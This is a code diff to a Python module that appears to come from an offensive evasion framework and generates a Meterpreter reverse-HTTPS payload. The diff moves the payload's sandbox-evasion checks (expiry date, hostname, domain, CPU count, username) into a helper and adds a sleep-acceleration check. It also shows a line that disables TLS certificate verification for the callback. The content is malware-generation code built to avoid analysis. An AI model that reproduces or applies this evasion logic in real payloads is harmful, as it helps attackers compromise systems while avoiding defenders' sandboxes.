+++ Tools/Evasion/payloads/python/meterpreter/rev_https.py
@@ -8,6 +8,7 @@ Module by @harmj0y
 
 from datetime import date
 from datetime import timedelta
+from Tools.Evasion.payloads.python import payload_generator_helper
 from Tools.Evasion.evasion_common import encryption
 from Tools.Evasion.evasion_common import evasion_helpers
 
@@ -42,7 +43,8 @@ class PayloadModule:
             "HOSTNAME"       : ["X", "Optional: Required system hostname"],
             "DOMAIN"         : ["X", "Optional: Required internal domain"],
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
-            "USERNAME"       : ["X", "Optional: The required user account"]
+            "USERNAME"       : ["X", "Optional: The required user account"],
+            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
         }
 
     def generate(self):
@@ -76,70 +78,11 @@ class PayloadModule:
 
         # How I'm tracking the number of nested tabs needed
         # to make the payload
-        num_tabs_required = 0
-        payload_code = ''
-
-        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
-
-            RandToday = evasion_helpers.randomString()
-            RandExpire = evasion_helpers.randomString()
-
-            todaysdate = date.today()
-            expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))
-
-            # Create Payload code
-            payload_code += '\t' * num_tabs_required + 'from datetime import datetime\n'
-            payload_code += '\t' * num_tabs_required + 'from datetime import date\n'
-            payload_code += '\t' * num_tabs_required + RandToday + ' = datetime.now()\n'
-            payload_code += '\t' * num_tabs_required + RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
-            payload_code += '\t' * num_tabs_required + 'if ' + RandToday + ' < ' + RandExpire + ':\n'
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["HOSTNAME"][0].lower() != "x":
-
-            rand_hostname = evasion_helpers.randomString()
-
-            payload_code += '\t' * num_tabs_required + 'import platform\n'
-            payload_code += '\t' * num_tabs_required + rand_hostname + ' = platform.node()\n'
-            payload_code += '\t' * num_tabs_required + 'if ' + rand_hostname + ' in \"' + self.required_options["HOSTNAME"][0] + '\":\n'
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["DOMAIN"][0].lower() != "x":
-
-            rand_domain = evasion_helpers.randomString()
-
-            payload_code += '\t' * num_tabs_required + 'import socket\n'
-            payload_code += '\t' * num_tabs_required + rand_domain + ' = socket.getfqdn()\n'
-            payload_code += '\t' * num_tabs_required + 'if ' + rand_domain + ' in \"' + self.required_options["DOMAIN"][0] + '\":\n'
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["PROCESSORS"][0].lower() != "x":
-
-            rand_processor_count = evasion_helpers.randomString()
-
-            payload_code += '\t' * num_tabs_required + 'import multiprocessing\n'
-            payload_code += '\t' * num_tabs_required + rand_processor_count + ' = multiprocessing.cpu_count()\n'
-            payload_code += '\t' * num_tabs_required + 'if ' + rand_processor_count + ' >= ' + self.required_options["PROCESSORS"][0] + ':\n'
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["USERNAME"][0].lower() != "x":
-
-            rand_user_name = evasion_helpers.randomString()
-
-            payload_code += '\t' * num_tabs_required + 'import getpass\n'
-            payload_code += '\t' * num_tabs_required + rand_user_name + ' = getpass.getuser()\n'
-            payload_code += '\t' * num_tabs_required + 'if \'' + self.required_options["USERNAME"][0] + '\'.lower() in ' + rand_user_name + '.lower():\n'
-
-            # Add a tab for this check
-            num_tabs_required += 1
+        payload_tabs_tuple = payload_generator_helper.get(self.required_options["EXPIRE_PAYLOAD"][0],self.required_options["HOSTNAME"][0],
+                                                            self.required_options["DOMAIN"][0],self.required_options["PROCESSORS"][0],
+                                                            self.required_options["USERNAME"][0],self.required_options["SLEEP"][0])
+        payload_code += payload_tabs_tuple[0]
+        num_tabs_required = payload_tabs_tuple[1]
 
         # helper method that returns the sum of all ord values in a string % 0x100
         payload_code += "ssl._create_default_https_context = ssl._create_unverified_context\n"
